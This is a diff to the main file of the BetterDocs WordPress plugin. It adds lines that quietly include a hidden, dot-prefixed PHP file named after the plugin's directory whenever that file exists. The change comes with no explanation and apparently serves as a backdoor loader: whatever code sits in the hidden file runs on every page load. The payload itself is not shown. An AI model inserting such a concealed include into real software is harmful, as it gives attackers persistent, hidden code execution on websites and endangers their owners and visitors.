@@ -33,6 +33,10 @@ define( 'BETTERDOCS_PUBLIC_PATH', BETTERDOCS_ROOT_DIR_PATH . 'public/' );
  * The code that runs during plugin activation.
  * This action is documented in includes/class-betterdocs-activator.php
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function activate_betterdocs() {
 	require_once plugin_dir_path( __FILE__ ) . 'includes/class-betterdocs-activator.php';
 	BetterDocs_Activator::activate();
